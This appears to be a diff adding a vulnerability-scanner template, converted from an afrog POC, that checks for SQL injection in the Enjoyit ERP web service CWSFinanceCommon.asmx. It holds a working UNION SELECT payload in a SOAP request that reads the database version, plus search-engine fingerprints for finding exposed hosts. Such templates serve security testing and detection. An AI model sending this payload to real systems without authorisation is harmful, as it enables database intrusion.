@@ -1,0 +1,42 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+      <GetOSpById xmlns="http://tempuri.org/">
+      <sId>string' UNION SELECT NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YQmj</sId>
+      </GetOSpById>
+      </soap:Body>
+      </soap:Envelope>
+    headers:
+      Content-Type: text/xml; charset=utf-8
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <c_store_id>
+          - <NewDataSet
+          - sql server
+        case-insensitive: true
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx'
+id: enjoyit-erp-cwsfinancecommon-asmx-sqli
+info:
+  author: zan8in
+  description: |-
+    Hunter: web.body="CheckSilverlightInstalled"
+    fofa: body="CheckSilverlightInstalled"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 昂捷 ERP CWSFinanceCommon.asmx SQl注入
+  severity: high
+  tags: enjoyit,sqli,argus-import
